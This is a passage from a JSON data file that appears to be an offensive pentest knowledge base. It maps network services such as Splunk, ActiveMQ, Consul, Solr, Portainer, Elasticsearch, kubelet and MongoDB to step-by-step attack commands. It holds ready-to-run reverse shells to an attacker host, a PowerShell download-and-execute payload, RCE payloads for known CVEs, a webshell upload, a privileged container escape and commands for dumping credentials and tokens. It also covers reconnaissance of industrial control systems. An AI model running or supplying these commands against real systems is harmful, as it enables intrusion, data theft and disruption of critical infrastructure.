    "label": "Fingerprint management + web ports",
    "cmd": "nmap -p8089,8000 -sV <TARGET_IP> -oN nmap_splunk.txt ; curl -sk https://<TARGET_IP>:8089/services/server/info | head",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Confirm creds against the REST API",
    "cmd": "curl -sk -u <USER>:<PASS> https://<TARGET_IP>:8089/services/server/info | grep -i version",
    "when": "if creds or defaults known",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Remote app-bundle RCE (reverse shell)",
    "cmd": "python3 PySplunkWhisperer2_remote.py --host <TARGET_IP> --port 8089 --username <USER> --password <PASS> --lhost <ATTACKER_IP> --payload 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <LPORT> >/tmp/f'",
    "when": "if creds known (Linux target)",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "privesc",
    "label": "Windows payload runs as SYSTEM",
    "cmd": "python3 PySplunkWhisperer2_remote.py --host <TARGET_IP> --port 8089 --username <USER> --password <PASS> --lhost <ATTACKER_IP> --payload 'powershell -c IEX(New-Object Net.WebClient).DownloadString(\"http://<ATTACKER_IP>/rev.ps1\")'",
    "when": "if Splunk runs as SYSTEM",
    "yields": [
     "shell",
     "admin"
    ]
   }
  ]
 },
 {
  "ports": [
   8161,
   61616
  ],
  "service": "activemq",
  "aliases": [
   "http",
   "jetty",
   "activemq",
   "apache-activemq",
   "openwire"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "8161 is the ActiveMQ web console (Jetty) — default admin/admin logs you in, and an unpatched broker is vulnerable to the OpenWire deserialization RCE (CVE-2023-46604) delivered via the 61616 data port.",
  "categories": [
   "web-exploitation",
   "service-exploitation",
   "vuln-assessment",
   "initial-foothold"
  ],
  "attack": [
   "T1190",
   "T1210",
   "T1078.001",
   "T1059",
   "T1505.003"
  ],
  "keywords": [
   "activemq",
   "admin:admin",
   "curl -u",
   "cve-2023-46604",
   "nuclei activemq",
   "jetty",
   "openwire",
   "apache_activemq_rce",
   "cve-2016-3088",
   "fileserver"
  ],
  "yields": [
   "foothold",
   "shell"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint broker + web console",
    "cmd": "nmap -p61616,8161 -sV --script banner <TARGET_IP> -oN nmap_activemq.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Grab exact version from web console",
    "cmd": "curl -s -u admin:admin http://<TARGET_IP>:8161/admin/ | grep -i -E 'activemq|version'",
    "when": "if 8161 open",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "OpenWire RCE CVE-2023-46604 (serve Spring XML)",
    "cmd": "python3 -m http.server 8000 & ./ActiveMQ-RCE -i <TARGET_IP> -u http://<ATTACKER_IP>:8000/poc.xml",
    "when": "if version <= 5.18.2 / 5.17.5 / 5.16.6 / 5.15.15",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "OpenWire RCE via metasploit",
    "cmd": "msfconsole -q -x 'use exploit/multi/misc/apache_activemq_rce_cve_2023_46604; set RHOSTS <TARGET_IP>; set RPORT 61616; set SRVHOST <ATTACKER_IP>; set LHOST <ATTACKER_IP>; set LPORT <LPORT>; run; exit'",
    "when": "if version vulnerable to CVE-2023-46604",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Legacy Fileserver JSP upload (CVE-2016-3088)",
    "cmd": "curl -u admin:admin -X PUT http://<TARGET_IP>:8161/fileserver/shell.jsp --data-binary @shell.jsp",
    "when": "if ActiveMQ < 5.14 with fileserver app",
    "yields": [
     "shell",
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   8500,
   8600
  ],
  "service": "consul",
  "aliases": [
   "fmtp",
   "consul",
   "hashicorp-consul",
   "consul-http"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "HashiCorp Consul's agent API on 8500 is usually wide open on the internal net — the KV store leaks app secrets and DB creds, and if script checks are enabled you register a service whose health check is your reverse shell, giving RCE as the consul agent on every node it schedules to.",
  "categories": [
   "service-mesh",
   "secrets-mgmt",
   "cicd-security",
   "cloud-native-runtime"
  ],
  "attack": [
   "T1610",
   "T1059",
   "T1552.001",
   "T1613",
   "T1190",
   "T1552",
   "T1106"
  ],
  "keywords": [
   "consul",
   "/v1/agent/self",
   "/v1/catalog/services",
   "/v1/kv",
   "enable_script_checks",
   "service/register",
   "v1/agent",
   "v1/kv",
   "consul_service_exec",
   "consul_rexec_rce"
  ],
  "yields": [
   "shell",
   "creds",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint the agent and its config",
    "cmd": "curl -s --max-time 5 http://<TARGET_IP>:8500/v1/agent/self | jq '.Config, .DebugConfig.EnableScriptChecks, .DebugConfig.EnableLocalScriptChecks'",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "List registered services and nodes",
    "cmd": "curl -s http://<TARGET_IP>:8500/v1/catalog/services | jq . && curl -s http://<TARGET_IP>:8500/v1/catalog/nodes | jq -r '.[].Node'",
    "when": "if API responds",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Dump the KV store for secrets",
    "cmd": "curl -s 'http://<TARGET_IP>:8500/v1/kv/?recurse=true' | jq -r '.[] | .Key+\": \"+(.Value|@base64d)'",
    "when": "if KV readable",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "RCE via a service health-check script",
    "cmd": "curl -s -X PUT http://<TARGET_IP>:8500/v1/agent/service/register -d '{\"Name\":\"pwn\",\"Address\":\"127.0.0.1\",\"Port\":80,\"Check\":{\"Args\":[\"/bin/sh\",\"-c\",\"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"],\"Interval\":\"10s\"}}'",
    "when": "if script checks enabled",
    "yields": [
     "shell",
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   8983
  ],
  "service": "solr",
  "aliases": [
   "solr",
   "apache-solr",
   "solrcloud"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "The unauthenticated admin UI hands you core names, and if you can PUT a config change you enable the Velocity response writer and hit /select with a template param (CVE-2019-17558) for RCE as the solr user; CVE-2017-12629's RunExecutableListener is the alternate path on older builds.",
  "categories": [
   "service-exploitation",
   "web-exploitation",
   "exploit-dev",
   "metasploit"
  ],
  "attack": [
   "T1190",
   "T1059",
   "T1210"
  ],
  "keywords": [
   "solr",
   "cve-2019-17558",
   "velocity",
   "admin/cores",
   "params.resource.loader",
   "cve-2017-12629"
  ],
  "yields": [
   "shell",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "List cores and version",
    "cmd": "curl -s 'http://<TARGET_IP>:8983/solr/admin/cores?action=STATUS&wt=json' | jq '.status | keys, .[].version'",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Confirm config API is writable",
    "cmd": "curl -s 'http://<TARGET_IP>:8983/solr/CORENAME/config' | jq '.config.requestHandler | keys'",
    "when": "if core found",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Enable Velocity template response writer",
    "cmd": "curl -s http://<TARGET_IP>:8983/solr/CORENAME/config -H 'Content-type:application/json' -d '{\"update-queryresponsewriter\":{\"startup\":\"lazy\",\"name\":\"velocity\",\"class\":\"solr.VelocityResponseWriter\",\"template.base.dir\":\"\",\"solr.resource.loader.enabled\":\"true\",\"params.resource.loader.enabled\":\"true\"}}'",
    "when": "if config writable",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Velocity template RCE (CVE-2019-17558)",
    "cmd": "curl -s 'http://<TARGET_IP>:8983/solr/CORENAME/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+$rt.getRuntime().exec(\"id\")'",
    "when": "if Velocity writer enabled",
    "yields": [
     "shell",
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   9000,
   9443
  ],
  "service": "portainer",
  "aliases": [
   "cslistener",
   "portainer",
   "tungsten-https"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "Portainer is a web UI onto the Docker/K8s API, so the fast wins are an uninitialized admin (first-boot account is yours) or weak creds — either way you proxy the Docker API to create a privileged, host-mounted container, and its DB also stores endpoint and registry creds.",
  "categories": [
   "docker-security",
   "container-cloud",
   "web-exploitation",
   "secrets-mgmt"
  ],
  "attack": [
   "T1190",
   "T1610",
   "T1611",
   "T1552"
  ],
  "keywords": [
   "portainer",
   "/api/users/admin/check",
   "/api/auth",
   "/api/endpoints",
   ":9000",
   "/docker/containers/create"
  ],
  "yields": [
   "shell",
   "admin",
   "creds"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Detect Portainer and its version",
    "cmd": "curl -sk --max-time 5 http://<TARGET_IP>:9000/api/system/version",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Check for an uninitialized admin",
    "cmd": "curl -s -o /dev/null -w '%{http_code}\\n' http://<TARGET_IP>:9000/api/users/admin/check",
    "when": "always",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Authenticate and grab a JWT",
    "cmd": "curl -s -X POST http://<TARGET_IP>:9000/api/auth -H 'Content-Type: application/json' -d '{\"Username\":\"<USER>\",\"Password\":\"<PASS>\"}'",
    "when": "if creds known or admin uninitialized",
    "yields": []
   },
   {
    "phase": "privesc",
    "label": "Create a host-mounted container via the proxied Docker API",
    "cmd": "curl -sk -H \"Authorization: Bearer $JWT\" -X POST 'http://<TARGET_IP>:9000/api/endpoints/1/docker/containers/create?name=pwn' -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"chroot\",\"/hostfs\",\"sh\",\"-c\",\"id\"],\"HostConfig\":{\"Binds\":[\"/:/hostfs\"],\"Privileged\":true}}'",
    "when": "if authenticated with a Docker endpoint",
    "yields": [
     "shell",
     "admin"
    ]
   },
   {
    "phase": "loot",
    "label": "Dump stored endpoint and registry credentials",
    "cmd": "curl -sk -H \"Authorization: Bearer $JWT\" http://<TARGET_IP>:9000/api/endpoints | jq '.[].AzureCredentials, .[].Name' ; curl -sk -H \"Authorization: Bearer $JWT\" http://<TARGET_IP>:9000/api/registries | jq .",
    "when": "if authenticated",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   9000
  ],
  "service": "sonarqube",
  "aliases": [
   "sonarqube",
   "sonar",
   "cslistener"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "SonarQube holds the full source of every project it scans, so default admin:admin (or a leaked token) lets you pull source through /api/sources/raw and grep it for hardcoded credentials and keys: the real payoff is the secrets in the code, which pivot you into the systems SonarQube only observes.",
  "categories": [
   "web-exploitation",
   "service-exploitation",
   "supply-chain",
   "secrets-mgmt"
  ],
  "attack": [
   "T1190",
   "T1078",
   "T1213",
   "T1552.001"
  ],
  "keywords": [
   "sonarqube",
   "api/projects",
   "api/sources",
   "admin:admin",
   "9000",
   "gitleaks"
  ],
  "yields": [
   "source-code",
   "creds",
   "admin"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm version (maps to known CVEs)",
    "cmd": "curl -s http://<TARGET_IP>:9000/api/server/version ; curl -s http://<TARGET_IP>:9000/api/system/status",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Authenticate and list projects",
    "cmd": "curl -s -u admin:admin http://<TARGET_IP>:9000/api/projects/search | jq -r '.components[].key'",
    "when": "if default creds work",
    "yields": [
     "admin"
    ]
   },
   {
    "phase": "loot",
    "label": "Dump source of a project file",
    "cmd": "curl -s -u admin:admin 'http://<TARGET_IP>:9000/api/sources/raw?key=PROJECT_KEY:src/config.py'",
    "when": "if authenticated",
    "yields": [
     "source-code"
    ]
   },
   {
    "phase": "loot",
    "label": "Scan pulled source for secrets",
    "cmd": "gitleaks detect --source ./sonar_src --no-git -v",
    "when": "after pulling source",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   9092,
   9093
  ],
  "service": "kafka",
  "aliases": [
   "kafka",
   "apache-kafka",
   "kafka-broker"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "An unauthenticated broker lets you list topics and replay every message from the beginning, and topic names like 'audit', 'events' or 'user-signups' are where credentials, tokens and PII leak in plaintext, so the loot is in the message log, not the service.",
  "categories": [
   "service-exploitation",
   "recon",
   "observability-sec"
  ],
  "attack": [
   "T1190",
   "T1046",
   "T1213",
   "T1552"
  ],
  "keywords": [
   "kcat",
   "kafkacat",
   "kafka-console-consumer",
   "kafka-topics",
   "bootstrap-server"
  ],
  "yields": [
   "creds",
   "source-code"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint broker",
    "cmd": "nmap -p9092,9093 -sV <TARGET_IP> -oN nmap_kafka.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "List metadata and topics",
    "cmd": "kcat -b <TARGET_IP>:9092 -L",
    "when": "always",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Consume a topic from the beginning",
    "cmd": "kcat -b <TARGET_IP>:9092 -t TOPIC -C -o beginning -e",
    "when": "if topics readable",
    "yields": [
     "creds",
     "source-code"
    ]
   },
   {
    "phase": "enum",
    "label": "Enumerate with the native CLI",
    "cmd": "kafka-topics.sh --bootstrap-server <TARGET_IP>:9092 --list",
    "when": "if kcat unavailable",
    "yields": []
   },
   {
    "phase": "lateral",
    "label": "Reuse harvested creds",
    "cmd": "nxc ssh <TARGET_IP> -u <USER> -p '<PASS>' --continue-on-success",
    "when": "if creds found in messages",
    "yields": [
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   9100,
   9101,
   9102
  ],
  "service": "jetdirect",
  "aliases": [
   "jetdirect",
   "hp-pdl-datastr",
   "pdl-datastream"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "Raw-print 9100 speaks PJL/PostScript, so PRET turns the printer into a file server — `fs` commands read the device filesystem (often holding cached print jobs and the embedded LDAP/SMTP credentials the printer uses to scan-to-folder), which is a classic lateral credential theft.",
  "categories": [
   "recon",
   "service-exploitation",
   "file-ops",
   "password-ops"
  ],
  "attack": [
   "T1046",
   "T1005",
   "T1552.001",
   "T1187"
  ],
  "keywords": [
   "pret",
   "pret.py",
   "pjl",
   "pjl-ready-message",
   "nmap pjl"
  ],
  "yields": [
   "creds",
   "file-read",
   "source-code"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Probe PJL and read the device ready message",
    "cmd": "nmap -p9100 --script pjl-ready-message <TARGET_IP> -oN nmap_pjl.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Open a PJL filesystem shell",
    "cmd": "python3 pret.py <TARGET_IP> pjl",
    "when": "always",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Walk the printer filesystem",
    "cmd": "python3 pret.py <TARGET_IP> pjl  # then: ls, fuzz path, cat ../../etc/passwd",
    "when": "always",
    "yields": [
     "file-read",
     "creds"
    ]
   },
   {
    "phase": "loot",
    "label": "Capture queued/printed jobs via PostScript",
    "cmd": "python3 pret.py <TARGET_IP> ps  # then: capture / hold / overlay",
    "when": "if postscript supported",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Pull stored LDAP/SMTP address-book creds (SNMP)",
    "cmd": "snmpwalk -v2c -c public <TARGET_IP>",
    "when": "if snmp open",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   9200,
   9300
  ],
  "service": "elasticsearch",
  "aliases": [
   "elasticsearch",
   "wap-wsp"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "Usually wide open with no auth — read every index for app data and credentials; very old nodes also give RCE through the Groovy/MVEL script sandbox escapes.",
  "categories": [
   "service-exploitation",
   "web-exploitation",
   "recon",
   "metasploit"
  ],
  "attack": [
   "T1046",
   "T1190",
   "T1005"
  ],
  "keywords": [
   "elasticsearch",
   "_cat/indices",
   "_search",
   "cve-2015-1427",
   "cve-2014-3120",
   "9200",
   "_cluster/health"
  ],
  "yields": [
   "creds",
   "source-code",
   "shell"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm the node and version",
    "cmd": "curl -s http://<TARGET_IP>:9200/",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "List all indices",
    "cmd": "curl -s 'http://<TARGET_IP>:9200/_cat/indices?v'",
    "when": "if anonymous allowed",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "loot",
    "label": "Dump an index for secrets",
    "cmd": "curl -s 'http://<TARGET_IP>:9200/INDEX/_search?pretty&size=1000'",
    "when": "if anonymous allowed",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "RCE via Groovy sandbox escape",
    "cmd": "curl -s -XPOST 'http://<TARGET_IP>:9200/_search?pretty' -d '{\"size\":1,\"script_fields\":{\"x\":{\"lang\":\"groovy\",\"script\":\"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}'",
    "when": "if version 1.3.x-1.3.7 / 1.4.x (CVE-2015-1427)",
    "yields": [
     "shell"
    ]
   }
  ]
 },
 {
  "ports": [
   10250,
   10255
  ],
  "service": "kubelet",
  "aliases": [
   "kubelet",
   "unknown"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "The read-only 10255 leaks /pods with every container's env and mounted token, and the authenticated 10250 /exec runs commands inside any pod without cluster creds — kubeletctl automates scanning both and harvesting tokens for an API pivot.",
  "categories": [
   "k8s-security",
   "container-cloud",
   "cloud-native-runtime"
  ],
  "attack": [
   "T1613",
   "T1609",
   "T1552.007"
  ],
  "keywords": [
   "kubeletctl",
   "curl 10250",
   "/pods",
   "/runningpods",
   "10255",
   "scan token"
  ],
  "yields": [
   "shell",
   "creds",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Dump pods from the read-only port",
    "cmd": "curl -s --max-time 5 http://<TARGET_IP>:10255/pods | jq -r '.items[].metadata | .namespace+\"/\"+.name'",
    "when": "if 10255 open",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Enumerate pods via the authenticated kubelet",
    "cmd": "kubeletctl --server <TARGET_IP> pods",
    "when": "if 10250 open",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Execute a command inside a running pod",
    "cmd": "kubeletctl --server <TARGET_IP> exec \"id\" -p \"$POD\" -c \"$CONTAINER\" -n \"$NAMESPACE\"",
    "when": "if 10250 exec allowed",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "loot",
    "label": "Scan every pod for mounted ServiceAccount tokens",
    "cmd": "kubeletctl --server <TARGET_IP> scan token",
    "when": "if 10250 exec allowed",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "lateral",
    "label": "Pivot a stolen token to the API server",
    "cmd": "kubectl --server=https://<TARGET_IP>:6443 --insecure-skip-tls-verify --token=$TOKEN auth can-i --list",
    "when": "if token recovered",
    "yields": [
     "foothold",
     "admin"
    ]
   }
  ]
 },
 {
  "ports": [
   11211
  ],
  "service": "memcached",
  "aliases": [
   "memcache",
   "memcached"
  ],
  "proto": "both",
  "risk": "medium",
  "note": "No auth by design — the value is in what is cached: dump keys to harvest session tokens, API keys, and password hashes that unlock the real target.",
  "categories": [
   "service-exploitation",
   "recon",
   "password-ops"
  ],
  "attack": [
   "T1046",
   "T1005",
   "T1552"
  ],
  "keywords": [
   "memcached-info",
   "memcstat",
   "memcdump",
   "stats items",
   "stats cachedump",
   "11211",
   "libmemcached-tools"
  ],
  "yields": [
   "creds",
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Pull server stats",
    "cmd": "nmap -sV -p11211 --script=memcached-info <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Confirm stats interactively",
    "cmd": "memcstat --servers=<TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "List slabs and item counts",
    "cmd": "printf 'stats items\\r\\nquit\\r\\n' | nc -q1 <TARGET_IP> 11211",
    "when": "if reachable",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Dump cached keys and values",
    "cmd": "memcdump --servers=<TARGET_IP> | while read k; do printf 'get %s\\r\\n' \"$k\" | nc -q1 <TARGET_IP> 11211; done",
    "when": "if reachable",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   20000
  ],
  "service": "dnp3",
  "aliases": [
   "dnp"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "DNP3 is the SCADA master/outstation protocol in power and water utilities; enumerating the outstation address and reading analog/binary points reveals the process state, and with no authentication in the base protocol a crafted command can actuate outputs.",
  "categories": [
   "recon",
   "service-exploitation",
   "vuln-assessment"
  ],
  "attack": [
   "T1046",
   "T0846",
   "T0861",
   "T0855"
  ],
  "keywords": [
   "dnp3-info",
   "dnp3-enumerate",
   "opendnp3",
   "nmap dnp3"
  ],
  "yields": [
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint the DNP3 outstation",
    "cmd": "nmap -p20000 -sV --script dnp3-info <TARGET_IP> -oN nmap_dnp3.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Brute-force the outstation/link address (Redpoint)",
    "cmd": "nmap -p20000 --script dnp3-enumerate <TARGET_IP>",
    "when": "if outstation address unknown",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Map the device/firmware to the matching advisory",
    "cmd": "searchsploit dnp3",
    "when": "if device identified",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   27017,
   27018,
   27019
  ],
  "service": "mongodb",
  "aliases": [
   "mongodb",
   "mongod"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "The classic finding is no authentication at all: connect and dump whole collections for app credentials, session tokens, and password hashes to reuse elsewhere.",
  "categories": [
   "service-exploitation",
   "recon",
   "post-exploitation-linux"
  ],
  "attack": [
   "T1046",
   "T1078",
   "T1005"
  ],
  "keywords": [
   "mongodb-info",
   "mongodb-databases",
   "mongo",
   "mongosh",
   "mongodump",
   "show dbs",
   "db.getcollectionnames"
  ],
  "yields": [
   "creds",
   "source-code"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint and list databases unauth",
    "cmd": "nmap -sV -p27017 --script=mongodb-info,mongodb-databases <TARGET_IP>",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "foothold",
    "label": "Connect with the shell",
    "cmd": "mongosh --host <TARGET_IP> --port 27017",
    "when": "if anonymous allowed",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "enum",
    "label": "Enumerate databases and collections",
    "cmd": "mongosh --host <TARGET_IP> --port 27017 --eval 'db.adminCommand({listDatabases:1})'",
    "when": "if anonymous allowed",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "foothold",
    "label": "Authenticate when creds are required",
    "cmd": "mongosh 'mongodb://<USER>:<PASS>@<TARGET_IP>:27017/admin'",
    "when": "if creds known",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "loot",
    "label": "Dump a database for credentials",
    "cmd": "mongodump --host <TARGET_IP> --port 27017 --db admin --out ./mongo_loot",
    "when": "if access obtained",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   44818,
   2222
  ],
  "service": "ethernet-ip",
  "aliases": [
   "ethernet-ip-2",
   "ethernet-ip-1",
   "enip"
  ],
  "proto": "both",
  "risk": "high",
  "note": "EtherNet/IP (CIP over TCP 44818 / UDP 2222) is Allen-Bradley/Rockwell territory; enip-info returns the full identity object — vendor, product name, revision and serial — which pins the exact PLC/drive model and firmware for an unauthenticated CVE match.",
  "categories": [
   "recon",
   "service-exploitation",
   "vuln-assessment"
  ],
  "attack": [
   "T1046",
   "T0846",
   "T0888",
   "T0855"
  ],
  "keywords": [
   "enip-info",
   "cpppo",
   "pycomm3",
   "nmap enip"
  ],
  "yields": [
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Read the CIP identity object (vendor/product/rev/serial)",
    "cmd": "nmap -p44818 --script enip-info <TARGET_IP> -oN nmap_enip.txt",
    "when": "always",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "List CIP tags/attributes with pycomm3",
    "cmd": "python3 -c \"from pycomm3 import LogixDriver; d=LogixDriver('<TARGET_IP>'); d.open(); print(d.get_tag_list())\"",
    "when": "if logix controller",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Match identity to Rockwell advisory",
    "cmd": "searchsploit rockwell allen-bradley",
    "when": "if product/revision identified",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   47808
  ],
  "service": "bacnet",
  "aliases": [
   "bacnet"
  ],
  "proto": "udp",
  "risk": "medium",
  "note": "BACnet is building-automation (HVAC, access control); an unauthenticated Who-Is/ReadProperty gives you the device object — vendor, model, firmware, object list and often a descriptive location string — which both fingerprints the controller and maps the physical plant.",
  "categories": [
   "recon",
   "service-exploitation",
   "vuln-assessment"
  ],
  "attack": [
   "T1046",
   "T0846",
   "T0888",
   "T0861"
  ],
  "keywords": [
   "bacnet-info",
   "bacnet-stack",
   "bacwi",
   "bacrp",
   "nmap bacnet"
  ],
  "yields": [
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Read BACnet device properties via NSE",
    "cmd": "nmap -sU -p47808 --script bacnet-info <TARGET_IP> -oN nmap_bacnet.txt",
    "when": "always",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Who-Is discovery with bacnet-stack",
    "cmd": "bacwi",
    "when": "if on same segment",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Read a specific object property",
    "cmd": "bacrp 1234 device 1234 object-name  # device-instance object-type object-instance property",
    "when": "if device instance known",
    "yields": [
     "file-read"
    ]
   }
  ]
 },
 {
  "ports": [
   49152,
   49153,
   49154,
   49155,
   49156,
   49157
  ],
  "service": "dynamic-rpc",
  "aliases": [
   "msrpc",
   "unknown"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "The 49152-65535 high ports are the actual RPC services the endpoint mapper hands out, and a default -p- miss here means you never see DRSUAPI (DCSync), MS-EFSR (PetitPotam) or spoolss bindings - scan the full range and then map which UUID lives on which dynamic port before you build any relay or coercion.",
  "categories": [
   "recon",
   "ad-recon",
   "impacket-suite",
   "service-exploitation"
  ],
  "attack": [
   "T1046",
   "T1016",
   "T1018"
  ],
  "keywords": [
   "nmap -p-",
   "impacket-rpcdump",
   "impacket-rpcmap",
   "-p49152-65535",
   "ncacn_ip_tcp"
  ],
  "yields": [
   "users"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Full high-port sweep with versioning",
    "cmd": "nmap -p49152-65535 -sV -Pn --open <TARGET_IP> -oN nmap_highports.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Map each UUID to its dynamic port",
    "cmd": "impacket-rpcdump <TARGET_IP> | grep -iE 'Protocol|UUID|Binding'",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Brute the interfaces bound to a single dynamic port",
    "cmd": "impacket-rpcmap 'ncacn_ip_tcp:<TARGET_IP>[<PORT>]' -brute-uuids",
    "when": "if interface on a port is unknown",
    "yields": []
   }
  ]
 }
];
